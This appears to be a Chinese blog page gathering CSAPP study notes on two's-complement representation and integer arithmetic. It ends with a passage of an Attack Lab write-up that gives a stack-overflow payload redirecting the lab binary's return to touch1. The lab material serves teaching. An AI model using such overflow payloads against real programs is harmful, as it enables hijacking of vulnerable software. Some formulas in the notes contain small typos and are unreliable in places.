<p>我实在不记得什么了。</p>
<hr />
<p><strong>さよなら</strong><br />
<strong>再见了</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2025/01/25/CSAPP-2025-01-25/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/01/25/CSAPP-2025-01-25/" class="post-title-link" itemprop="url">CSAPP-2025-01-25</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-01-25 20:11:15" itemprop="dateCreated datePublished" datetime="2025-01-25T20:11:15+08:00">2025-01-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">组成原理</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="整数的运算第二章-part2">整数的运算(第二章 Part2)</h1>
<h2 id="无符号数加法溢出">无符号数加法溢出</h2>
<p>无符号的数的加法溢出规则很简单, 单纯截取后 <span
class="math inline">\(w\)</span> 位, 或称对 <span
class="math inline">\(2^w\)</span> 取模。因此:</p>
<p><span class="math display">\[
x\ +_w^u\ y =
\begin{cases}
    x + y, &amp; x + y &lt; 2^w, \\
    x + y - 2^w, &amp; 2^w \leq x + y &lt; 2^{w+1}.
\end{cases}
\]</span></p>
<p>(<span class="math inline">\(+_w^u\)</span> 表示最多 <span
class="math inline">\(w\)</span> 位下的二进制无符号数加法。下文<span
class="math inline">\(+_w^t\)</span> 即 <span
class="math inline">\(w\)</span> 位补码加法)</p>
<h2 id="检验无符号数加法溢出">检验无符号数加法溢出</h2>
<p>若 <span class="math inline">\(s = x +_w^u y\)</span>, 当且仅当 <span
class="math inline">\(s &lt; x\)</span> （或等价地 <span
class="math inline">\(s &lt; y\)</span>） 时发生溢出。</p>
<p>(当然, 默认 <span class="math inline">\(x\)</span> 和 <span
class="math inline">\(y\)</span> 本身不会溢出, 即在 <span
class="math inline">\([0, UMax_w]\)</span> 的范围内)</p>
<p>原理易证, 分别证明充分性必要性即可, 注意利用以上公式</p>
<h2 id="补码加法溢出">补码加法溢出</h2>
<p>同样是截断,
但因为符号位的存在(还记得我们说的为什么补码最后被实际应用吗?
因为符号位本身是数值的一部分, 在计算中只要通过对 <span
class="math inline">\(2^w\)</span> 取模和截断就能运算出正确的数值,
类似一种环绕, 本质就是数论上的同余概念)显得略微复杂。</p>
<p><span class="math display">\[
x\ +_w^u\ y =
\begin{cases}
    x + y - 2^w, &amp; 2^{w-1} \leq x + y, \\
    x + y, &amp; -2^{w-1} \leq x + y &lt; 2^{w-1}, \\
    x + y + 2^w, &amp; x + y &lt; -2^{w-1}
\end{cases}
\]</span></p>
<p>多了就减, 少了就加, 数值都是 <span
class="math inline">\(2^w\)</span>。</p>
<p>推导就要用到 ”补码和无符号数的位级操作是一样的“。Formally:</p>
<p><span class="math display">\[
x +_w^t y = U2T(T2U(x) +_w^u T2U(y)
\]</span></p>
<p>(严格应写作 <span class="math inline">\(U2T_w\)</span>, 此处省略)
由于里面的两个 <span class="math inline">\(T2U\)</span> 只是可能地加上
<span class="math inline">\(2^w\)</span> (当且仅当最高符号位为 <span
class="math inline">\(1\)</span>), 而这两个带有 <span
class="math inline">\(2^w\)</span> 的项都被最外面无符号数加法的截断时的
<span class="math inline">\(\mod 2^w\)</span> 消除了,
所以最后其实就是</p>
<p><span class="math display">\[
x +_w^t y = U2T[(x + y)\mod 2^w].
\]</span></p>
<p>考虑 <span class="math inline">\(U2T\)</span>
的公式以及上篇文章经典的那张无符号数转补码的数值对应图,
分类讨论即可。</p>
<h2 id="检查补码加法溢出">检查补码加法溢出</h2>
<p>令 <span class="math inline">\(s = x +_w^t y\)</span>, 当且仅当 <span
class="math inline">\(x &gt; 0, y &gt; 0\)</span> 但 <span
class="math inline">\(s \leq 0\)</span> 或 <span class="math inline">\(x
&lt; 0, y &lt; 0\)</span> 但 <span class="math inline">\(s \geq
0\)</span> 时发生溢出。当然这里还是默认 <span class="math inline">\(x,
y\)</span> 本身在合理的 <span class="math inline">\(w\)</span>
位可表示的补码范围内。</p>
<h2 id="加法逆元">加法逆元</h2>
<p>感兴趣群论的知识可以去 b 站搜一下, 但实际上此处只是涉及一些概念,
浅尝辄止即可。</p>
<p>模数加法形成 <em>阿尔贝群 (Abelian group)</em> . 也就是说,
模数加法可交换、可结合。</p>
<blockquote>
<p>还记得那个梗吗？</p>
<p>判断孩子是否有数学天赋就问孩子为什么 1+ 2 = 2 + 1 ?</p>
<p>然后孩子说 因为整数集对加法构成阿尔贝群</p>
</blockquote>
<p>对于群的操作 “<span class="math inline">\(\cdot\)</span>”
和群中的元素 <span class="math inline">\(a\)</span>, <em>单位元</em>
<span class="math inline">\(e\)</span> 是群中唯一满足 $a e = e $
的元素。</p>
<p><em>逆元</em> 就是对于群中某元素 <span
class="math inline">\(a\)</span>， <span
class="math inline">\(a\)</span> 的逆元 <span
class="math inline">\(a^{-1}\)</span> 满足 <span class="math inline">\(a
\cdot a^{-1} = e\)</span></p>
<p>这个群的单位元是<del>欧元</del> <span
class="math inline">\(0\)</span> ,</p>
<p>而 无符号数 <span class="math inline">\(x\)</span>
的无符号数加法逆元满足:</p>
<p><span class="math display">\[
-_w^u\ x=
\begin{cases}
    x, &amp; x = 0, \\
    2^w - x, &amp; x &gt; 0.
\end{cases}
\]</span></p>
<p>而 补码 <span class="math inline">\(x\)</span>
的补码加法逆元满足:</p>
<p><span class="math display">\[
-_w^t\ x=
\begin{cases}
    x, &amp; x = TMin_w, \\
    -x, &amp; x &gt; TMin_w.
\end{cases}
\]</span></p>
<h2 id="乘法">乘法</h2>
<p>无符号数乘法直接按照模 <span class="math inline">\(2^w\)</span> 截断,
补码还是按照 <em>位级操作与无符号数相同原理</em>
先分别转换成无符号数再按照无符号乘法计算位模式,
最后转换为补码的数值。</p>
<h3 id="乘以-2-的幂次">乘以 2 的幂次</h3>
<p>一个常识是乘以 <span class="math inline">\(2^k\)</span> 就等价于左移
<span class="math inline">\(k\)</span>
位。虽然这一点显而易见也易于证明(通过公式定义即可),
但其实有一些可以说的地方, 例如 <span class="math inline">\(x \cdot 14 =
(x &lt;&lt; 3) + (x &lt;&lt; 2) + (x &lt;&lt; 1) = x \cdot (x &lt;&lt;
4) - (x &lt;&lt; 1)\)</span></p>
<p>具体来说, 如果一个表达式 <span class="math inline">\(x \cdot
k\)</span> 的 <span class="math inline">\(k\)</span> 能表示为 <span
class="math inline">\([(0...0)(1...1)(0...0)...(1...1)]\)</span>
即一段的 <span class="math inline">\(0\)</span> 和一段的 <span
class="math inline">\(1\)</span> 的序列，考虑一组从位置 <span
class="math inline">\(l\)</span> 到 位置 <span
class="math inline">\(r\)</span> 的 <span
class="math inline">\(1\)</span> 序列 <span class="math inline">\((l
\leq r)\)</span>, 这个位对乘积的影响可以表达为两个形式:(注意虽然 <span
class="math inline">\(l \leq r\)</span>
但其实二进制表示上下标大的在前面)</p>
<p><span class="math inline">\((x&lt;&lt;r) + (x&lt;&lt;(r-1)) + ... +
(x &lt;&lt; l)\)</span> 或</p>
<p><span class="math inline">\((x &lt;&lt; (r + 1)) - (x &lt;&lt;
l)\)</span></p>
<p>其实还可以想一想当 <span class="math inline">\(l, r\)</span>
为什么条件时第一种更好(左移和加减次数最少),
为什么条件时第二种更好。这也是 CSAPP 的习题之一。</p>
<h3 id="除以-2-的幂次">除以 2 的幂次</h3>
<p>你可能会想, 不就是右移 <span class="math inline">\(k\)</span>
位？但右移 <span class="math inline">\(k\)</span> 位计算的是 <span
class="math inline">\(\lfloor x / 2^k \rfloor\)</span>,
而一般的编程语言中除法是<strong>向零取整</strong>(即舍去小数点)而不是向下取整的(这点是程序设计课重灾区)。而大多数
OIer 或 ACMer 应该都很熟悉向上取整的方法: $a / b = (a + b - 1) / b
$。如果 <span class="math inline">\(a \mod b == 0\)</span> 那么 <span
class="math inline">\(b - 1\)</span> 会直接被向下取整舍掉,
否则就会令结果 <span class="math inline">\(+1\)</span>。</p>
<p>因此有 C 语言表达式
<code>(x &lt; 0 ? x + (1 &lt;&lt; k) - 1 : x) &gt;&gt; k</code> 计算数值
<span class="math inline">\(x / 2^k\)</span>。</p>
<p>这个向上取整的方法叫做 <em>偏置(biasing)</em> . 我们甚至还可以用右移
<span class="math inline">\(31\)</span> 位再 and
上掩码等各种手段判负从而优化掉条件语句 <del>这也是习题</del></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2025/01/19/CSAPP-2025-01-19/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/01/19/CSAPP-2025-01-19/" class="post-title-link" itemprop="url">CSAPP-2025-01-19</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-01-19 10:43:30" itemprop="dateCreated datePublished" datetime="2025-01-19T10:43:30+08:00">2025-01-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">组成原理</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="整数的表示第二章-part1">整数的表示(第二章 Part1)</h1>
<p><del>博客还没装 Mathjax 插件，所以下面的 <span
class="math inline">\(\LaTeX\)</span> 应该都是乱的</del> 已修</p>
<h2 id="整数表示">整数表示</h2>
<p>这一段如果没有目的和顺序地硬看会觉得关系很多很复杂，但其实只要按照一定的目的和顺序结构就会很清晰。</p>
<h3 id="以设计者的视角思考如何设计">以设计者的视角思考如何设计</h3>
<p>如果我们是设计用二进制表示整数的人，我们需要如何表示二进制？</p>
<p>利用 <span class="math inline">\(w\)</span> 位二进制的最高位 $
x_{w-1} $ 为 <span class="math inline">\(1\)</span>
代表这个数是负数，剩下的部分正常用二进制表示即 <span
class="math inline">\(\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span></p>
<p>但显然光表示是完全不够的，我们还需要运算，<strong>而符号位由于不对具体数值做贡献，会导致运算错误。</strong>
因此我们需要让符号位也代表数值，用另一种映射方式计算，于是我们令最高位的符号位具有负的权重
<span class="math inline">\(-x_{w-1} \cdot
2^{w-1}\)</span>，这样符号位也参与了计算。但是这样数值又对不上了，因此我们需要把后面的位也变一下。由于我们不是真的设计师，所以我们直接看答案：取反后面的每一位后再
+1。例如<code>10010</code><strong>除符号位</strong>取反后变为<code>11101</code>，
+1后是<code>11110</code>。这样的表示方法计算出的数值是 <span
class="math inline">\(-x_{w-1}\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span>
如何论证这样的数值是对的呢？</p>
<p>我们称<code>10010</code> <code>11101</code> <code>11110</code>
这样的二进制形式为<em>位模式</em>或<em>位向量</em>。Formally, <span
class="math inline">\(w\)</span> 位的位向量 <span
class="math inline">\(\vec{x_w}=[x_{w-1}, x_{w-2}, ..., x_1,
x_0]\)</span> (其中 <span class="math inline">\(x \in \{0, 1\}, \text{
where } x \in
\mathbb{Z}\)</span>)。另外，称一开始的符号位不参与计算的位模式为<em>原码</em>，除符号位取反后的位模式为<em>反码</em>，取反后+1的为<em>补码</em>。我们还将<strong>以无符号整数形式</strong>(即所有位模式都是
<span class="math inline">\(2^{i}\)</span>
的权值)<strong>解释位模式所计算出的十进制数值</strong>这个过程写作一个函数
<span class="math inline">\(B2U(\vec{x_w})\)</span> 即 Binary to
Unsigned，易得<span class="math inline">\(B2U(\vec{x_w}) =
\displaystyle\sum_{i=0}^{w-1}x_i\cdot2^i\)</span>。类似地，我们有<strong>以反码形式解释位模式所计算出的十进制数值</strong>
<span class="math inline">\(B2O(\vec{x_w})\)</span>
和<strong>以补码形式解释位模式所计算出的十进制数值</strong> <span
class="math inline">\(B2T(\vec{x_w})\)</span>。对应地，我们也有这些函数的反函数<span
class="math inline">\(U2B(x), T2B(x), O2B(x)\)</span>。</p>
<p>则我们需要证明的问题以数学语言描述就是，设 <span
class="math inline">\(B2T(\vec{x_w}\prime) =
-x_{w-1}\prime\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\prime\cdot2^i\)</span>
那么我们需要表示的数值 <span class="math inline">\(x =
-\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i =
B2T(\vec{x_w}\prime)\)</span>, 其中 <span
class="math inline">\(\vec{x}\prime\)</span> 是 <span
class="math inline">\(T2B(x)\)</span> 即原码 <span
class="math inline">\(\vec{x_w}\)</span> 取反后 +
1的位模式。(正数的无符号表示、原码、反码、补码都一样，以下只考虑负数)</p>
<p>考虑到 +1 导致的进位影响我们对 <span
class="math inline">\(\vec{x_w}\prime\)</span> 的表达，我们借助反码
<span class="math inline">\(\vec{x_w}\prime\prime\)</span>，根据定义得知
<span class="math inline">\(B2O(\vec{x_w}\prime\prime) + 1 =
B2T(\vec{x_w}\prime)\)</span> 。则 <span
class="math inline">\(x_i\prime\prime = (1 -
x_i)\)</span>一个连等式就能证明全部：</p>
<p><del>(沟槽的 hexo-filter-mathjax 插件有 Bug，我本地 MarkText 的
Mathjax 正常解析多行，这里就变单行了，对付看罢。)</del> 已修</p>
<p><span class="math display">\[
\begin{aligned}
x &amp;= -\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i \\
  &amp;= -2^{w-1} + 2^{w-1} - 1 -
\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i + 1 \\
  &amp;= -2^{w-1} + \displaystyle\sum_{i=0}^{w-2}2^i -
\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i + 1 \\
  &amp;= -2^{w-1} + \displaystyle\sum_{i=0}^{w-2}(1-x_i)\cdot2^i + 1
\end{aligned}
\]</span></p>
<p>其中 <span class="math inline">\((1-x_i)\)</span> 即反码的位模式
<span class="math inline">\(x_i\prime\prime\)</span>，
这样我们证明了补码的数值转换函数<span
class="math inline">\(B2T(\vec{x_w}) =
-x_{w-1}\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span>
的数值表示是正确的(实际上这个函数是一个双射)，而此时符号位也参与了运算，所以这套表示体系也能正常参与运算（后面会更详细地说明运算问题）</p>
<blockquote>
<p>事实上，补码也能正常参与运算，只是对 0 的表示有两种 (0000 和 1111)
。</p>
<p>给出补码的数值转换函数 <span class="math inline">\(B2O =
-x_{w-1}\cdot(2^{w-1}-1)+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span></p>
</blockquote>
<h3 id="如何取负">如何取负？</h3>
<p>既然我们有了补码的定义，很容易就知道对一个数 <span
class="math inline">\(x\)</span> 取相反数就是令 <span
class="math inline">\(x\)</span> 的补码 <span
class="math inline">\(\vec{x_w}\)</span> <strong>所有位</strong>
取反然后再 +1。</p>
<blockquote>
<p>Q: 为什么是所有位取反？补码不是除符号位取反再 +1 吗？</p>
<p>A: 取相反数符号位肯定要变化啊。我们是+3 -&gt; -3</p>
</blockquote>
<p>注意到这个其实就是 <span class="math inline">\(-x = (2^w - x) \mod
2^w\)</span>，
注意不到也没关系，<del>因为我就没注意到</del>，后面还会继续说这个事。</p>
<blockquote>
<p>想一想，设 <span class="math inline">\(\mathrm{TMin}\)</span> 为
<span class="math inline">\(w\)</span> 位补码表示的最小数值，那么：</p>
<ul>
<li><p><span class="math inline">\(\mathrm{TMin}\)</span>
的补码位模式(即 <span class="math inline">\(T2B(\mathrm{TMin})\)</span>
) 是多少？</p></li>
<li><div class="sourceCode" id="cb1"><pre
class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> custom_abs<span class="op">(</span><span class="dt">signed</span> <span class="dt">int</span> x<span class="op">)</span> <span class="op">&#123;</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span><span class="op">(</span>x <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="cf">return</span> <span class="op">-</span>x<span class="op">;</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> x<span class="op">;</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#125;</span></span></code></pre></div>
<p>这段代码有什么问题？</p></li>
</ul>
</blockquote>
<h3 id="补码的不对称性">补码的不对称性</h3>
<p>根据上面的问题，我们发现 <code>custom_abs(TMin)</code> 返回的还是
TMin.</p>
<p>在补码语境下，由于符号位是 1 表示的都是正数，符号位是 0
的表示的都是非负数，这两者表示的数字个数相等，而 0
不是正数也不是负数，但它是非负数，所以表示的正数比负数少一个，所以 <span
class="math inline">\(\mathrm{TMax + 1 = abs(TMin)}\)</span> , 例如对 4
字节正数，最大值是 <span class="math inline">\(2^{31} - 1 =
2147483647\)</span>, 而最小值是 <span class="math inline">\(-2^{31} =
-2147483648\)</span>。</p>
<blockquote>
<p>在 C 和 C++
语言中，<code>unsigned</code>修饰的无符号数以无符号形式解释，即我们的
<span class="math inline">\(B2U\)</span>， 其他的则以补码解释。</p>
<p>Java 以补码解释。Rust <code>i32</code> <code>i64</code>
等以补码表示，<code>u32</code> 等以无符号数形式解释。</p>
<p>C 和 C++ 的 <code>unsigned</code>
溢出是行为良好的，上下溢出都是循环，但有符号正数的溢出是未定义行为。注意浮点数的溢出也是行为良好的，因为
IEEE 754 规定了溢出产生正负无穷。</p>
<p>Java 的溢出是行为良好的，按照补码规则循环环绕到最小值</p>
<p>Rust 的溢出取决于编译模式，<code>Debug</code>
模式会触发<code>panic</code> ，<code>Release</code> 模式类似 Java。</p>
<p>Python
不太清楚具体怎么表示的，理论上只要内存够应该不存在溢出的情况？我还在学
py。</p>
</blockquote>
<h3 id="无符号数解释和补码解释的关系">无符号数解释和补码解释的关系</h3>
<p>对于一个位模式 <span class="math inline">\(\vec{x_w}\)</span>
以无符号数解释的数值 <span class="math inline">\(B2U(\vec{x_w})\)</span>
和以补码解释的数值 <span class="math inline">\(B2T(\vec{x_w})\)</span>
有什么关系？考虑这两者的公式（设 <span class="math inline">\(x_{w-1} =
1\)</span> )：</p>
<p><span class="math inline">\(B2U(\vec{x_w}) =
\displaystyle\sum_{i=0}^{w-1}x_i\cdot2^i =
x_{w-1}\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span></p>
<p><span class="math inline">\(B2T(\vec{x_w}) =
-x_{w-1}\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span></p>
<p>发现只有最高为的权重正负不同，即两者只差 <span
class="math inline">\(2 \times 2^{w-1} = 2^w\)</span></p>
<p>当然如果是正数，<span class="math inline">\(x_{w-1} = 0\)</span>
则二者相等。</p>
<p>故：<span class="math inline">\(B2U(\vec{x_w}) - 2^w =
B2T(\vec{x_w})\)</span></p>
<p>于是就有了这个经典的图：</p>
<p><img src="../images/2025-01-19-122537_hyprshot.png" /></p>
<h3 id="取相反数">取相反数</h3>
<p>我们上面说了取相反数就是 <span class="math inline">\(-x = (2^w - x)
\mod 2^w\)</span> .下面来证明一下。</p>
<p>Formaly, 我们需要证明 <span class="math inline">\(U2B(2^w - b) =
T2B(-b)\)</span> ,急症 $B2T(U2B(2^w - b)) = -b $</p>
<p>由上面说到的 <span class="math inline">\(B2U(\vec{x_w}) - 2^w =
B2T(\vec{x_w})\)</span> ，令 <span class="math inline">\(x = U2B(2^w -
b)\)</span></p>
<p>得 <span class="math inline">\(B2T(U2B(2^w - b)) = B2U(U2B(2^w - b))
- 2^2 = 2^w - b - 2^w = -b\)</span></p>
<p>得证。</p>
<p>举个例子:</p>
<p><span class="math inline">\(T2B(-3) = U2B(2^w - 3) =
T2B(-3)\)</span></p>
<h3 id="扩展和截断">扩展和截断</h3>
<p>无符号数扩展直接补 <span class="math inline">\(0\)</span> 在前面,
补码扩展在前面补 <span class="math inline">\(1\)</span>,
可以证明是正确的。</p>
<p>截断无符号数相当于对 <span class="math inline">\(2^k\)</span> 取模,
截断补码相当于位模式下截断无符号数再转换为补码表示。</p>
<p>换句话说就是：无符号数和补码的操作在位级表示上是相同的,
这一点会在后面大量用到。</p>
<h3 id="总结">总结:</h3>
<p>这里我们用数学公式以权重的方式解释了补码的表示原理和常用的转换关系。</p>
<p>从不过这部分的知识可以以更优雅的方式即群论表示。</p>
<p>补码实际上就是模 <span class="math inline">\(2^w\)</span>
的同余群。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2024/12/29/CSAPP-Lab-Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/29/CSAPP-Lab-Attack/" class="post-title-link" itemprop="url">CSAPP Attack Lab 笔记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-12-29 21:53:00" itemprop="dateCreated datePublished" datetime="2024-12-29T21:53:00+08:00">2024-12-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">组成原理</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="phase-0x1">Phase 0x1</h2>
<p>一个练手的，要求通过缓冲区栈溢出攻击来调用 touch1</p>
<p><code>gdb ctarget</code> 然后 <code>set args -q</code>
防止与不存在的服务器通信（<code>run -q</code> 也可以)
<code>b Gets</code> <code>run -q</code></p>
<p>看一下栈信息:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────[ STACK ]────────────────────────</span><br><span class="line">00:0000│ rsp 0x5561dc70 —▸ 0x4017b4 (getbuf+12) ◂— movl $1, %eax</span><br><span class="line">01:0008│ rdi 0x5561dc78 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">05:0028│     0x5561dc98 —▸ 0x55586000 ◂— 0</span><br><span class="line">06:0030│     0x5561dca0 —▸ 0x401976 (test+14) ◂— movl %eax, %edx</span><br><span class="line">07:0038│     0x5561dca8 —▸ 0x55685fe8 —▸ 0x402fa5 ◂— pushq $0x3a6971 /* &#x27;hqi:&#x27; */</span><br></pre></td></tr></table></figure>
<p>rsp 是当前栈顶指针，由于是在 Gets 的开头查看的，所以栈顶存的就是 Gets
的返回地址</p>
<p>思路应该是覆盖栈顶指针 <code>0x5561dc70</code> 处的 正确返回地址为
<code>touch1</code> 的地址<code>0x4017c0</code></p>
<p>如何覆盖？看一下读入字符串的逻辑：</p>
<p><code>_IO_getc@plt</code> 很明显是库函数 getchar()<br />
那附近是一个循环，如果是 -1 (<code>0x7ffffffff</code>) 就跳出，<br />
如果不是 0xA (经查表这个就是 ASCII 的行分隔符）就读入下一个 char</p>
<p>那就看一下读入单个字符的逻辑<br />
$rbx = $rdi, 推测 $rdi 作为 Gets()
的第一个参数就是存到的字符串地址<br />
也就是说 (%rdi) 应该就是我们输入的字符串存储地址的第一位
当然这里因为要调用 <code>_IO_getc</code> 并且 rdi
是调用者保存寄存器<br />
所以先用 rbx 存一下 rdi</p>
<p>看了下 Gets 的 $rdi 存的是 <code>0x5561dc78</code><br />
发现其实缓冲区不在 Gets() 的栈帧里(78 &gt; 70, 栈内存向低地址增长）…</p>
<p>重新观察 <code>getbuf</code> 的汇编代码，发现
<code>sub $0x28, %rsp</code>，分配了 40 字节的缓冲区<br />
由于缓冲区栈溢出攻击的原理大概是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 注意这个栈是从高地址向低地址增加的</span><br><span class="line"></span><br><span class="line">+------------------------+ 高地址</span><br><span class="line">| caller 返回地址        | &lt;- 函数返回时跳转的位置 0x5561dca0</span><br><span class="line">+------------------------+</span><br><span class="line">| buffer[40]             | &lt;- callee 的栈帧</span><br><span class="line">| buffer[39]             |</span><br><span class="line">| ...                    | &lt;- 缓冲区</span><br><span class="line">| buffer[1]              |</span><br><span class="line">| buffer[0]              | &lt;- 缓冲区起始           0x5561dc78</span><br><span class="line">+------------------------+ 低地址</span><br></pre></td></tr></table></figure>
<p>所以只能向相对缓冲区更高的地址溢出，于是换个思路，在 getbuf 处 ret 到
<code>touch1()</code><br />
所以就不用考虑 Gets 的细节了，一共 40 字节的 buffer, 直接填充 40 个
<code>00</code>，<br />
然后填充 <code>c0 17 40</code> 即可(gdb 中在 getbuf 起始处看 %rsp
也能发现就是 <code>0x5561dca0 = 0x5561dc78 + 0x28</code> )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure>
<p>一个地址对应的通常是一字节，而一个十六进制的每个位数是 4 个二进制位
(1111=15=f)</p>
<p>两个十六进制位就是一字节。</p>
<p>由于只有网络协议相关会用大端法，所以这里是小端法，地址小的位置存的是低位</p>
